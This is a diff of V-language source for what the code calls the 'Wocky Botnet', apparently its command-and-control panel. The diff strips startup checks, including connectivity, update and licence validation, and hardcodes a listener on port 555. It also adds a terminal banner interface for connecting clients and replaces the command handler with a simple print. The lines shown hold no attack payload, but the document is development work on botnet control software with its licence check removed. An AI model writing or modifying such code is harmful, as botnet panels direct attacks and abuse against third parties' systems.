@@ -18,26 +18,17 @@ import io
 import net
 import net.http
 import time
-#include "@VROOT/c_headers/test.c"
+#include "@VROOT/c_headers/utils.c"
 // #include <unistd.h>
 // fn read(int, string, int) int
-fn C.check()
+fn C.sleep_f(int)
 // fn C.fdopen(int, string)
 
 struct Current {}
 
 fn main() {
-	C.check()
-	time.sleep(5)
-	println(config.Clear)
-	mut port := wocky_cp.port_check(os.args)
-	wocky_cp.conn_check() or {
-		panic("[x] Error, You have no internet on this box to host Wocky Botnet!\r\n")
-	}
-	wocky_cp.check_update()
-	wocky_cp.licence_valiation()
-	go listener(port)
-	println('[+] NET Started on Port: $port')
+	go listener("555")
+	println('[+] NET Started on Port: 555')
 	wocky_cp.command_handler()
 }
 
@@ -55,6 +46,18 @@ fn listener(port string) {
 
 
 fn handle_client(mut socket net.TcpConn) {
+	mut empty_c := 0
+	mut reader := io.new_buffered_reader(reader: socket)
+	mut wuix := wocky_uix.UIX_Func{}
+	mut b := banner_sys.Banner{file: "ui"}
+	mut utils := utils.CLI{}
+	utils.resize_terminal(mut socket, 20, 87)
+	C.sleep_f(3)
+	socket.write_string(config.Clear) or { 0 }
+	b.start_banner_output(mut socket)
+	b.set_bannerfile("text")
+	b.read_banner_text(mut socket)
+	wuix.sock_move_cursor(mut socket, 17, 37)
 	for {
 		// u.set_title(mut socket, "${c_s.get_settings()[1]} | User: $username")
 		mut data := reader.read_line() or { "" }
@@ -68,7 +71,7 @@ fn handle_client(mut socket net.TcpConn) {
 			}
 			// println('${empty_c} fell in here')
 		}
-		server.cmd_handler(mut socket, data, username) // Main Command Handler
+		println(data)
 	}
 	reader.free()
 }
